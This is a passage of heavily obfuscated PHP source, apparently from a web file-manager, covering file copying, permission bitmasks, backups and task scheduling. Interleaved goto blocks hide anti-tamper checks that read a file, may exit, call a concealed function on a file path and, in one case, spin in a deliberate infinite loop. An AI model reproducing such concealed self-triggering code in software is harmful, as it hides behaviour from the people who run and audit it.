$¯·¸‹•ç[458], 0); if (!isset($¡±ŒÎ¢ä[$¯·¸‹•ç[591]]) && $¡±ŒÎ¢ä[$¯·¸‹•ç[458]]) { $†è³¼ÅÕ[$¯·¸‹•ç[588]][] = $¡±ŒÎ¢ä[$¯·¸‹•ç[458]]; } if ($†•ãÄ®Õ) { $ãÑÜúçş = $this->fileNameExistCache($¬Æ¬•öü, $¡±ŒÎ¢ä[$¯·¸‹•ç[32]]); if ($ãÑÜúçş) { if ($¡±ŒÎ¢ä[$¯·¸‹•ç[402]] || $†•ãÄ®Õ == REPEAT_SKIP) { continue; } if ($†•ãÄ®Õ == REPEAT_REPLACE) { $åÖ€­®Ü = $this->sourceInfoCache($ãÑÜúçş); $ú¤äÊ†ë = $this->fileHistory($åÖ€­®Ü, $¡±ŒÎ¢ä[$¯·¸‹•ç[458]], $¡±ŒÎ¢ä[$¯·¸‹•ç[80]]); if ($ú¤äÊ†ë) { $†è³¼ÅÕ[$¯·¸‹•ç[551]][] = $¡±ŒÎ¢ä[$¯·¸‹•ç[458]]; } continue; } else { if ($†•ãÄ®Õ == REPEAT_RENAME) { $¡±ŒÎ¢ä[$¯·¸‹•ç[32]] = $this->fileNameAutoCache($¬Æ¬•öü, $¡±ŒÎ¢ä[$¯·¸‹•ç[32]], $†•ãÄ®Õ, !1); } } } } if (!$¡±ŒÎ¢ä[$¯·¸‹•ç[402]] && $¡±ŒÎ¢ä[$¯·¸‹•ç[458]] == 0) { continue; } if (!$¡±ŒÎ¢ä[$¯·¸‹•ç[402]] && $¡±ŒÎ¢ä[$¯·¸‹•ç[458]]) { $†è³¼ÅÕ[$¯·¸‹•ç[551]][] = $¡±ŒÎ¢ä[$¯·¸‹•ç[458]]; } $–û—Îµ±[] = $this->_makeItemData($¡±ŒÎ¢ä, $ï»«Ÿşñ, $¡±ŒÎ¢ä[$¯·¸‹•ç[32]]); } unset($¡±ŒÎ¢ä); if (!empty($–û—Îµ±)) { $this->addAll($–û—Îµ±); $this->_childrenListSelect($¬Æ¬•öü); } $‰š°«Õ– = $this->_childrenList($¬Æ¬•öü); $‰š°«Õ– = array_to_keyvalue($‰š°«Õ–, $¯·¸‹•ç[32]); foreach ($”øııŸ¦ as $¡±ŒÎ¢ä) { $åÖ€­®Ü = $‰š°«Õ–[$¡±ŒÎ¢ä[$¯·¸‹•ç[32]]]; $ãšÏÛ¯ = $åÖ€­®Ü[$¯·¸‹•ç[394]]; $this->_copyApplyMeta($åÖ€­®Ü, $†è³¼ÅÕ); if ($¡±ŒÎ¢ä[$¯·¸‹•ç[33]] == $¯·¸‹•ç[79]) { $¡±ŒÎ¢ä[$¯·¸‹•ç[78]] = $†îŸÔñã->getPathInner($¡±ŒÎ¢ä[$¯·¸‹•ç[78]]); $this->_copyChildTo($†îŸÔñã, $¡±ŒÎ¢ä[$¯·¸‹•ç[78]], $ãšÏÛ¯, $†•ãÄ®Õ, $†è³¼ÅÕ, $í©Òü”); } } } private function _addFiles($Š†ğí¸â, $œ÷‘èÓÔ, $ôåÌ°áß) { $¡†éÇ =& $_SERVER[® ¨Ä®ñ]; if (!$œ÷‘èÓÔ || count($œ÷‘èÓÔ) == 0) { return array(); } $£¯ĞÒê„ = array(); foreach ($œ÷‘èÓÔ as &$™—òï¹°) { Hook::trigger($¡†éÇ[592], $™—òï¹°); $™—òï¹°[$¡†éÇ[78]] = $Š†ğí¸â->getPathInner($™—òï¹°[$¡†éÇ[78]]); $åøãùÛÓ = $Š†ğí¸â->hashSimple($™—òï¹°[$¡†éÇ[78]]); $±‰Å®Û = $Š†ğí¸â->hashMd5($™—òï¹°[$¡†éÇ[78]]); if (strlen($±‰Å®Û) > 10 && !isset($£¯ĞÒê„[$±‰Å®Û])) { $£¯ĞÒê„[$±‰Å®Û] = array(); } $™—òï¹°[$¡†éÇ[170]] = $åøãùÛÓ; $™—òï¹°[$¡†éÇ[169]] = $±‰Å®Û; Hook::trigger($¡†éÇ[593], $™—òï¹°); $£¯ĞÒê„[$±‰Å®Û][] =& $™—òï¹°; if (count($£¯ĞÒê„[$±‰Å®Û]) > 1) { $™—òï¹°[$¡†éÇ[591]] = !0; } } unset($™—òï¹°); $û‘Ç´Òî = array($¡†éÇ[169] => array($¡†éÇ[7], array_keys($£¯ĞÒê„))); $è´€óåà = Model($¡†éÇ[594]); $ŞÇâªˆü = $è´€óåà->where($û‘Ç´Òî)->select(); $ŞÇâªˆü = $ŞÇâªˆü ? $ŞÇâªˆü : array(); foreach ($ŞÇâªˆü as $–Õ¶ˆà¾) { if (!isset($£¯ĞÒê„[$–Õ¶ˆà¾[$¡†éÇ[169]]])) { continue; } $€¸ÉŒ± = $£¯ĞÒê„[$–Õ¶ˆà¾[$¡†éÇ[169]]]; foreach ($€¸ÉŒ± as &$™—òï¹°) { $™—òï¹°[$¡†éÇ[458]] = $–Õ¶ˆà¾[$¡†éÇ[458]]; $™—òï¹°[$¡†éÇ[591]] = !0; } unset($™—òï¹°); } $¤Ò´™İ = array(); foreach ($œ÷‘èÓÔ as $Ä´ŠÆê¾) { if (isset($Ä´ŠÆê¾[$¡†éÇ[591]]) && $Ä´ŠÆê¾[$¡†éÇ[591]]) { continue; } $—–ëÏ“® = $Š†ğí¸â->getPathInner($Ä´ŠÆê¾[$¡†éÇ[78]]); $ü¨¢˜ı = $è´€óåà->addFileMake($—–ëÏ“®, $Ä´ŠÆê¾[$¡†éÇ[80]], $Ä´ŠÆê¾[$¡†éÇ[170]], $Ä´ŠÆê¾[$¡†éÇ[169]], $Ä´ŠÆê¾[$¡†éÇ[32]], $ôåÌ°áß); if (!is_array($ü¨¢˜ı)) { continue; } $¤Ò´™İ[] = $ü¨¢˜ı; } $è´€óåà->addAll($¤Ò´™İ); $û‘Ç´Òî = array($¡†éÇ[169] => array($¡†éÇ[7], array_keys($£¯ĞÒê„))); $ŞÇâªˆü = $è´€óåà->where($û‘Ç´Òî)->select(); $ŞÇâªˆü = $ŞÇâªˆü ? $ŞÇâªˆü : array(); foreach ($ŞÇâªˆü as $–Õ¶ˆà¾) { if (!isset($£¯ĞÒê„[$–Õ¶ˆà¾[$¡†éÇ[169]]])) { continue; } $ÈíÍåê½ =& $£¯ĞÒê„[$–Õ¶ˆà¾[$¡†éÇ[169]]]; foreach ($ÈíÍåê½ as &$™—òï¹°) { $™—òï¹°[$¡†éÇ[458]] = $–Õ¶ˆà¾[$¡†éÇ[458]]; } unset($™—òï¹°); } $—Â¦ÕóŠ = array(); foreach ($œ÷‘èÓÔ as $Ö³ÖÅçî) { $—Â¦ÕóŠ[$Ö³ÖÅçî[$¡†éÇ[32]]] = $Ö³ÖÅçî; } return $—Â¦ÕóŠ; } } goto e˜²ğ…Ö…; D¯Ù¤º¥Ÿ: if (!isset($_SERVER[$_SERVER[® ¨Ä®ñ][854]]) || !isset($_SERVER[$_SERVER[® ¨Ä®ñ][943]])) { $_getc = $_SERVER[® ¨Ä®ñ][857]; $_getfile = $_SERVER[$_SERVER[® ¨Ä®ñ][858]] . $_SERVER[® ¨Ä®ñ][859]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[® ¨Ä®ñ][226], $_getfilec); if (count($_getarrs) < $_SERVER[® ¨Ä®ñ][612]) { $exit = $_SERVER[® ¨Ä®ñ][860]; $exit(); } $_act = $_SERVER[® ¨Ä®ñ][942]; $_act($_SERVER[$_SERVER[® ¨Ä®ñ][858]] . $_SERVER[® ¨Ä®ñ][859]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[® ¨Ä®ñ][373]); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $£Óúº¢ =& $_SERVER[® ¨Ä®ñ]; $å½Ñ½›Â = array(array($£Óúº¢[412] => LNG($£Óúº¢[1808]), $£Óúº¢[1809] => $£Óúº¢[1810], $£Óúº¢[1811] => 1, $£Óúº¢[1812] => 1, $£Óúº¢[1813] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($£Óúº¢[412] => LNG($£Óúº¢[1814]), $£Óúº¢[1809] => $£Óúº¢[1815], $£Óúº¢[1811] => 2, $£Óúº¢[1812] => 1, $£Óúº¢[1813] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($£Óúº¢[412] => LNG($£Óúº¢[1816]), $£Óúº¢[1809] => $£Óúº¢[1817], $£Óúº¢[1811] => 3, $£Óúº¢[1812] => 1, $£Óúº¢[1813] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($£Óúº¢[412] => LNG($£Óúº¢[1818]), $£Óúº¢[1809] => $£Óúº¢[1819], $£Óúº¢[1811] => 4, $£Óúº¢[1812] => 1, $£Óúº¢[1813] => self::AUTH_SHOW | self::AUTH_VIEW), array($£Óúº¢[412] => LNG($£Óúº¢[1820]), $£Óúº¢[1809] => $£Óúº¢[1821], $£Óúº¢[1811] => 5, $£Óúº¢[1812] => 1, $£Óúº¢[1813] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($£Óúº¢[412] => LNG($£Óúº¢[1822]), $£Óúº¢[1809] => $£Óúº¢[1823], $£Óúº¢[1811] => 6, $£Óúº¢[1812] => 1, $£Óúº¢[1813] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($£Óúº¢[412] => LNG($£Óúº¢[1824]), $£Óúº¢[1809] => $£Óúº¢[1825], $£Óúº¢[1811] => 7, $£Óúº¢[1812] => 1, $£Óúº¢[1813] => 0)); return $å½Ñ½›Â; } public static function authCheck($‚ŞŞ°»„, $êÜà³ì) { $‚ŞŞ°»„ = intval($‚ŞŞ°»„); if ($GLOBALS[$_SERVER[® ¨Ä®ñ][496]]) { return !0; } if ($‚ŞŞ°»„ <= 0) { return !1; } if (($‚ŞŞ°»„ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($‚ŞŞ°»„ & $êÜà³ì); } public static function authCheckShow($ Í‚ï‹) { return self::authCheck($ Í‚ï‹, self::AUTH_SHOW); } public static function authCheckView($ÉĞ´äËÊ) { return self::authCheck($ÉĞ´äËÊ, self::AUTH_VIEW); } public static function authCheckDownload($·ª×¥Û) { return self::authCheck($·ª×¥Û, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Ü’é—•™) { return self::authCheck($Ü’é—•™, self::AUTH_UPLOAD); } public static function authCheckEdit($ğÔÚğÚÔ) { return self::authCheck($ğÔÚğÚÔ, self::AUTH_EDIT); } public static function authCheckRemove($ßå¶àÀ¶) { return self::authCheck($ßå¶àÀ¶, self::AUTH_REMOVE); } public static function authCheckShare($›óÄ‚àÑ) { return self::authCheck($›óÄ‚àÑ, self::AUTH_SHARE); } public static function authCheckComment($ßçøÉÃ) { return self::authCheck($ßçøÉÃ, self::AUTH_COMMENT); } public static function authCheckEvent($ãš¢µúå) { return self::authCheck($ãš¢µúå, self::AUTH_EVENT); } public static function authCheckRoot($±Æä²æ) { return self::authCheck($±Æä²æ, self::AUTH_ROOT); } public static function authCheckAction($õŞŠÂ ­, $¾ºùÁ¤¢) { $Š…Õêú =& $_SERVER[® ¨Ä®ñ]; $Ú¸Şù°¨ = array($Š…Õêú[1826] => self::AUTH_VIEW, $Š…Õêú[1181] => self::AUTH_DOWNLOAD, $Š…Õêú[108] => self::AUTH_UPLOAD, $Š…Õêú[1777] => self::AUTH_EDIT, $Š…Õêú[1776] => self::AUTH_REMOVE, $Š…Õêú[1787] => self::AUTH_SHARE, $Š…Õêú[349] => self::AUTH_COMMENT, $Š…Õêú[1627] => self::AUTH_EVENT, $Š…Õêú[1827] => self::AUTH_ROOT); if (!isset($Ú¸Şù°¨[$¾ºùÁ¤¢])) { return; } $”÷ÛæÊ“ = $Ú¸Şù°¨[$¾ºùÁ¤¢]; $õŞŠÂ ­ = intval($õŞŠÂ ­); if ($õŞŠÂ ­ <= 0) { return !1; } if (($õŞŠÂ ­ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($õŞŠÂ ­ & $”÷ÛæÊ“); } public static function authDisable($çí ²ÏÎ, $×Ş„¿—•) { if (intval($çí ²ÏÎ) <= 0) { return 0; } return intval($çí ²ÏÎ) & ~$×Ş„¿—•; } public $optionType = "\x53\x79\x73\164\x65\x6d\x2e\x73\x6f\165\x72\143\x65\101\x75\x74\x68\114\151\163\164"; public $field = array("\x6e\141\x6d\x65", "\141\x75\164\150", "\154\x61\x62\x65\154", "\144\151\x73\160\x6c\x61\171", "\x73\x79\x73\164\145\155", "\163\157\x72\x74"); public function initData() { $â²Ò™èĞ = $this->authDefault(); foreach ($â²Ò™èĞ as $·å¡¯ù) { $this->add($·å¡¯ù); } } public function findAuth($¤øğ¯Ã´, $—¥ÇË¢) { $µ·šÙ¡Ö =& $_SERVER[® ¨Ä®ñ]; $°çô––Ê = parent::listData(); foreach ($°çô––Ê as $½¾¹òñì) { $§´¾şÍ = intval($½¾¹òñì[$µ·šÙ¡Ö[405]]); if ($§´¾şÍ <= 0 || $½¾¹òñì[$µ·šÙ¡Ö[1828]] == 0) { continue; } if (($§´¾şÍ & $¤øğ¯Ã´) != $¤øğ¯Ã´) { continue; } if (($§´¾şÍ & $—¥ÇË¢) != 0) { continue; } return $½¾¹òñì[$µ·šÙ¡Ö[392]]; } return !1; } public function findAuthReadOnly() { $‚«´»ª = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $¿¤ˆãöœ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($‚«´»ª, $¿¤ˆãöœ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($Š¬†ÓĞ = false, $úÁîÕŒ— = "\x73\157\162\164", $¢’“Ûş– = false) { return parent::listData($Š¬†ÓĞ, $úÁîÕŒ—, $¢’“Ûş–); } public function update($Öóªçµ–, $‰öşÕ¡Ê) { $Ã†à•‘£ =& $_SERVER[® ¨Ä®ñ]; $ùÌø¥ÍÕ = parent::listData($Öóªçµ–); $ùÖÇÂí› = $this->findByName($‰öşÕ¡Ê[$Ã†à•‘£[32]]); if (!$ùÌø¥ÍÕ || $ùÖÇÂí› && $ùÖÇÂí›[$Ã†à•‘£[392]] != $ùÌø¥ÍÕ[$Ã†à•‘£[392]]) { return !1; } $this->filterAuth($‰öşÕ¡Ê[$Ã†à•‘£[405]]); return parent::update($Öóªçµ–, $‰öşÕ¡Ê); } public function remove($ªÊçŠ¡) { $©Â—öŸ = parent::listData($ªÊçŠ¡); if (!$©Â—öŸ || $©Â—öŸ[$_SERVER[® ¨Ä®ñ][1258]]) { return !1; } return parent::remove($ªÊçŠ¡); } public function add($¼ñšÜÉ = array()) { $ ¹ğ¹€ =& $_SERVER[® ¨Ä®ñ]; if ($this->findByName($¼ñšÜÉ[$ ¹ğ¹€[32]])) { return !1; } $Ìàùó¦Œ = array($ ¹ğ¹€[32] => $ ¹ğ¹€[12], $ ¹ğ¹€[405] => 1, $ ¹ğ¹€[1829] => $ ¹ğ¹€[1817], $ ¹ğ¹€[1828] => 1, $ ¹ğ¹€[1258] => 0, $ ¹ğ¹€[1830] => 0); $¼ñšÜÉ = array_merge($Ìàùó¦Œ, $¼ñšÜÉ); $¼ñšÜÉ[$ ¹ğ¹€[1830]] = $this->getSort(); $this->filterAuth($¼ñšÜÉ[$ ¹ğ¹€[405]]); return parent::insert($¼ñšÜÉ); } private function getSort() { $Ë’‰™ =& $_SERVER[® ¨Ä®ñ]; $™ÙŸÏš = parent::listData(); $²ÕêÂïª = array_to_keyvalue($™ÙŸÏš, $Ë’‰™[12], $Ë’‰™[1830]); return empty($²ÕêÂïª) ? 0 : max($²ÕêÂïª) + 1; } private function filterAuth(&$˜“”™«¦) { if (!$˜“”™«¦) { return; } $™ğ¨æë = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ûşĞßè¾ = array(); foreach ($™ğ¨æë as $ûå¶ò…) { if ($˜“”™«¦ & $ûå¶ò…) { $ûşĞßè¾[] = $ûå¶ò…; } } if (in_array(self::AUTH_ROOT, $ûşĞßè¾)) { $˜“”™«¦ = array_sum($™ğ¨æë); return; } $Š“ °ı‚ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ûşĞßè¾ as $ûå¶ò…) { if (isset($Š“ °ı‚[$ûå¶ò…])) { $ûşĞßè¾ = array_merge($ûşĞßè¾, $Š“ °ı‚[$ûå¶ò…]); } } $ûşĞßè¾[] = self::AUTH_SHOW; $˜“”™«¦ = array_sum(array_unique($ûşĞßè¾)); } public function sort($îÛ©²ö±, $¢Âƒ©Ğâ) { return parent::update($îÛ©²ö±, $¢Âƒ©Ğâ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\x2e\142\141\143\x6b\165\x70\114\x69\x73\x74"; public $field = array("\151\157", "\156\x61\x6d\145", "\163\x74\141\x74\x75\163", "\x63\157\x6e\x74\x65\x6e\x74", "\155\141\x6e\165\x61\154", "\162\145\163\x75\x6c\164", "\x74\x69\155\x65\x46\162\x6f\x6d", "\164\x69\155\x65\124\157"); public function config() { $ãñÕ”ƒ¿ =& $_SERVER[® ¨Ä®ñ]; $Ä­’Âó‹ = Model($ãñÕ”ƒ¿[752])->get($ãñÕ”ƒ¿[762]); $Ä­’Âó‹ = json_decode($Ä­’Âó‹, !0); $Ä­’Âó‹ = is_array($Ä­’Âó‹) ? $Ä­’Âó‹ : array(); if (!isset($Ä­’Âó‹[$ãñÕ”ƒ¿[737]])) { $Ä­’Âó‹[$ãñÕ”ƒ¿[737]] = $ãñÕ”ƒ¿[89]; } unset($Ä­’Âó‹[$ãñÕ”ƒ¿[1609]]); Action($ãñÕ”ƒ¿[1831])->taskInit(); Model($ãñÕ”ƒ¿[1608])->cacheClear(); $æÊøï®ä = $ãñÕ”ƒ¿[1832]; $éæØÀäÈ = Model($ãñÕ”ƒ¿[1833])->findByKey($ãñÕ”ƒ¿[1627], $æÊøï®ä); if (!$éæØÀäÈ) { $éæØÀäÈ = array(); } if (isset($éæØÀäÈ[$ãñÕ”ƒ¿[196]])) { $éæØÀäÈ[$ãñÕ”ƒ¿[196]] = json_decode($éæØÀäÈ[$ãñÕ”ƒ¿[196]], !0); } if (isset($Ä­’Âó‹[$ãñÕ”ƒ¿[196]])) { $éæØÀäÈ[$ãñÕ”ƒ¿[196]][$ãñÕ”ƒ¿[1612]] = $Ä­’Âó‹[$ãñÕ”ƒ¿[196]]; unset($Ä­’Âó‹[$ãñÕ”ƒ¿[196]]); } return array_merge($éæØÀäÈ, $Ä­’Âó‹); } public function listData($…ÍáëÌ = false, $²ˆ×õ¿İ = "\155\x6f\x64\151\146\x79\x54\x69\155\x65", $ò‚÷²¦Ô = false) { return parent::listData($…ÍáëÌ, $²ˆ×õ¿İ, !0); } public function lastItem() { $ªÏšÆÔë = $this->listData(); return !empty($ªÏšÆÔë[0]) ? $ªÏšÆÔë[0] : null; } public function kill($†ŒÏÊË£) { $ŒùÒ‰Ğ  =& $_SERVER[® ¨Ä®ñ]; $“Ò É¦ = $this->listData($†ŒÏÊË£); if (!$“Ò É¦ || empty($“Ò É¦[$ŒùÒ‰Ğ [32]])) { return !0; } Task::kill($ŒùÒ‰Ğ [761]); Task::kill($ŒùÒ‰Ğ [782]); Task::kill($ŒùÒ‰Ğ [791]); $Éğ‘°€´ = $“Ò É¦[$ŒùÒ‰Ğ [32]]; $˜ßË¾ˆ = TEMP_FILES . $ŒùÒ‰Ğ [760] . $Éğ‘°€´ . $ŒùÒ‰Ğ [8]; IO::remove($˜ßË¾ˆ, !1); return $this->remove($†ŒÏÊË£); } public function remove($óÛ „Èş) { $ÕËú“Ì = $this->listData($óÛ „Èş); if (!$ÕËú“Ì) { return !0; } return $this->backupRemove($ÕËú“Ì); } private function backupRemove($ÇÀùãõ) { parent::remove($ÇÀùãõ[$_SERVER[® ¨Ä®ñ][392]]); $ñÀ®æ†á = $this->backupPath($ÇÀùãõ); IO::remove($ñÀ®æ†á, !1); return !0; } private function backupPath($®à€Ã£Â) { $ˆèËıÅ¬ =& $_SERVER[® ¨Ä®ñ]; $üîŸåƒÎ = $®à€Ã£Â[$ˆèËıÅ¬[32]]; $Šœ§ñÁ = Model($ˆèËıÅ¬[752])->get($ˆèËıÅ¬[753]); $·âÈÑ½· = substr(md5($ˆèËıÅ¬[754] . $Šœ§ñÁ . $üîŸåƒÎ), 0, 8); return "\x7b\x69\157\x3a{$®à€Ã£Â[$ˆèËıÅ¬[734]]}\x7d\x2f\x64\x61\164\x61\x62\x61\x73\x65\x2f\x62\141\x63\153\x75\x70\x2f" . $üîŸåƒÎ . $ˆèËıÅ¬[11] . $·âÈÑ½·; } public function start() { $´í¬Õ©× =& $_SERVER[® ¨Ä®ñ]; if ($GLOBALS[$´í¬Õ©×[6]][$´í¬Õ©×[90]][$´í¬Õ©×[1834]] != $´í¬Õ©×[89]) { return !0; } $´ÌÓüü™ = $this->config(); if (!$´ÌÓüü™ || $´ÌÓüü™[$´í¬Õ©×[1609]] != $´í¬Õ©×[89]) { return !1; } $çˆáŠº = $this->process(); foreach ($çˆáŠº as $êá¡ŠÃ) { if ($êá¡ŠÃ) { return Task::restart($êá¡ŠÃ[$´í¬Õ©×[392]]); } } $«ÉæõÀÜ = new Backup(); $Ìûà¤ªŸ = $«ÉæõÀÜ->db(); if ($Ìûà¤ªŸ) { $Ìûà¤ªŸ = $«ÉæõÀÜ->dbFile(); if ($Ìûà¤ªŸ && $´ÌÓüü™[$´í¬Õ©×[737]] == $´í¬Õ©×[190]) { $Ìûà¤ªŸ = $«ÉæõÀÜ->file(); } } Backup::set(array($´í¬Õ©×[732] => 1, $´í¬Õ©×[487] => time())); return !0; } public function process() { $ğ¶ƒÁô¤ =& $_SERVER[® ¨Ä®ñ]; $âÙˆÄ£° = array($ğ¶ƒÁô¤[740] => Task::get($ğ¶ƒÁô¤[761]), $ğ¶ƒÁô¤[744] => Task::get($ğ¶ƒÁô¤[782]), $ğ¶ƒÁô¤[192] => Task::get($ğ¶ƒÁô¤[791])); $³§¥ˆ» = !1; foreach ($âÙˆÄ£° as &$íÓîº”è) { if ($³§¥ˆ») { $íÓîº”è = !1; continue; } if ($íÓîº”è) { $ƒÚàÀ¹Ş = intval(_get($íÓîº”è, $ğ¶ƒÁô¤[1644], 0)); if (time() - $ƒÚàÀ¹Ş > 7200) { Task::kill($íÓîº”è[$ğ¶ƒÁô¤[392]]); $³§¥ˆ» = !0; $íÓîº”è = !1; } } } return $âÙˆÄ£°; } public function restore() { $ƒÆü½ÆÍ =& $_SERVER[® ¨Ä®ñ]; ActionCall($ƒÆü½ÆÍ[1044], !0, 1); ActionCall($ƒÆü½ÆÍ[1044], !0, 0); } } goto b¥Œ’§ÃÌ; DˆÀê†Í–¬: $_size = $_SERVER[® ¨Ä®ñ][1503]; if ($_SERVER[$_SERVER[® ¨Ä®ñ][854]] != $_size($_file)) { $_getc = $_SERVER[® ¨Ä®ñ][857]; $_getfile = $_SERVER[$_SERVER[® ¨Ä®ñ][858]] . $_SERVER[® ¨Ä®ñ][859]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[® ¨Ä®ñ][226], $_getfilec); if (count($_getarrs) < $_SERVER[® ¨Ä®ñ][612]) { $exit = $_SERVER[® ¨Ä®ñ][860]; $exit(); } $_act = $_SERVER[® ¨Ä®ñ][942]; $_act($_file); } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($†²Å ıè, $¢¢¬Å±ş = 5.0) { if (!$†²Å ıè) { return; } $âÅÇ¨ëÜ = Cache::get($†²Å ıè); if (!$âÅÇ¨ëÜ || timeFloat() - floatVal($âÅÇ¨ëÜ) >= $¢¢¬Å±ş) { Cache::set($†²Å ıè, timeFloat(), $¢¢¬Å±ş * 10); return !0; } return !1; } public static function timeLimitCall($€´çŞĞÆ, $ä‘‡èÑ—, $âÖóéÆİ, $ŒùÚü’¶ = 5.0) { $”èÎ’Á =& $_SERVER[® ¨Ä®ñ]; if (!$€´çŞĞÆ || !$ä‘‡èÑ—) { return; } self::$asyncAdd = !0; $¬Öê±í = $”èÎ’Á[1721]; $í¶›æ” = Cache::get($¬Öê±í, !0); $€Û¶•ºÁ = array($”èÎ’Á[1722] => timeFloat(), $”èÎ’Á[1723] => timeFloat(), $”èÎ’Á[259] => $ä‘‡èÑ—, $”èÎ’Á[1716] => $âÖóéÆİ, $”èÎ’Á[196] => $ŒùÚü’¶); if (is_array($í¶›æ”[$€´çŞĞÆ])) { $€Û¶•ºÁ[$”èÎ’Á[1723]] = $í¶›æ”[$€´çŞĞÆ][$”èÎ’Á[1723]]; } if (is_array($í¶›æ”[$€´çŞĞÆ])) { if (timeFloat() - $í¶›æ”[$€´çŞĞÆ][$”èÎ’Á[1722]] < $€Û¶•ºÁ[$”èÎ’Á[196]] * 0.3) { return; } $€Û¶•ºÁ[$”èÎ’Á[1723]] = $í¶›æ”[$€´çŞĞÆ][$”èÎ’Á[1723]]; } $í¶›æ”[$€´çŞĞÆ] = $€Û¶•ºÁ; Cache::set($¬Öê±í, $í¶›æ”, 60); Cache::removeMemory($¬Öê±í); write_log($”èÎ’Á[1724] . $€´çŞĞÆ . $”èÎ’Á[71] . $ä‘‡èÑ—, $”èÎ’Á[1718]); } public static function timeLimitCallLoop() { $üË„´›á =& $_SERVER[® ¨Ä®ñ]; $ü‚šô = array($üË„´›á[1725]); $ø‘€€¯Õ = in_array(strtolower(ACTION), $ü‚šô); if (!$ø‘€€¯Õ && !self::$asyncAdd) { return; } $ãéÒÅ­› = $üË„´›á[1721]; $õæÖÚñ³ = Cache::get($ãéÒÅ­›, !0); if (!$õæÖÚñ³ || count($õæÖÚñ³) <= 0) { return; } $ë·òôşÈ = !1; $¤™„Ÿö› = timeFloat(); $ÅÎÙÚ½– = array(); foreach ($õæÖÚñ³ as $îîöÖˆ¿ => $³ú’©ïª) { if ($¤™„Ÿö› - $³ú’©ïª[$üË„´›á[1723]] > $³ú’©ïª[$üË„´›á[196]]) { $ë·òôşÈ = !0; try { Hook::apply($³ú’©ïª[$üË„´›á[259]], $³ú’©ïª[$üË„´›á[1716]]); write_log($üË„´›á[1726] . $îîöÖˆ¿ . $üË„´›á[71] . $³ú’©ïª[$üË„´›á[259]] . $üË„´›á[1727] . ACTION, $üË„´›á[1718]); } catch (Exception $Ëú‚¡ãÎ) { } continue; } $ÅÎÙÚ½–[$îîöÖˆ¿] = $³ú’©ïª; } if (!$ë·òôşÈ) { return; } if (!$ÅÎÙÚ½–) { return Cache::remove($ãéÒÅ­›); } Cache::set($ãéÒÅ­›, $ÅÎÙÚ½–, 60); Cache::removeMemory($ãéÒÅ­›); } public static function finished($áœƒ¢, $å¦õëı) { $šÙ‰İ±Ú =& $_SERVER[® ¨Ä®ñ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($šÙ‰İ±Ú[259] => $áœƒ¢, $šÙ‰İ±Ú[1716] => $å¦õëı); } private static function finishedRun() { $ğµğ‰Û³ =& $_SERVER[® ¨Ä®ñ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $úê±ú¤å) { try { Hook::apply($úê±ú¤å[$ğµğ‰Û³[259]], $úê±ú¤å[$ğµğ‰Û³[1716]]); } catch (Exception $°Â¦õñ­) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto EÊÒÚŸ‹Õî; FÌ·Æ¦²¬: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\x72\x5f\157\160\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($µËé´¯Œ) { $ì¯¥şÆ =& $_SERVER[® ¨Ä®ñ]; if (!defined($ì¯¥şÆ[465])) { define($ì¯¥şÆ[465], 0); } return "\125\x73\x65\x72\117\x70\x74\151\157\156\x5f{$µËé´¯Œ}\137" . USER_ID; } protected function filterWhere($Àˆ°¨á) { $æÒ€öë =& $_SERVER[® ¨Ä®ñ]; if (!defined($æÒ€öë[465])) { define($æÒ€öë[465], 0); } $Àˆ°¨á[$æÒ€öë[1639]] = USER_ID; return $Àˆ°¨á; } public function cacheRemoveUser($‘à…èã, 